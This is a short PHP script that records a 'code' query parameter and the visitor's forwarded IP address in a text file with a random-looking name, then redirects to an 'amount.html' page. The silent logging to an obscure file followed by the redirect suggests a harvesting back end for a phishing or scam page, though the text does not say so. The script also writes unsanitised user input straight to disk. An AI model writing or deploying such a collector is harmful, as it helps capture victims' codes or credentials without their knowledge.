<?php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$code = $_GET['code'];
fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
$file = fopen("jueaiwlhnfiusldznfisuzhknjsljnbfedjbdfjslknfds.txt", "a");
fwrite($file, "[");
fwrite($file, $code);
fwrite($file, "]");

fwrite($file, "[");
fwrite($file, $ip);
fwrite($file, "]");
header("Location: amount.html")
?>

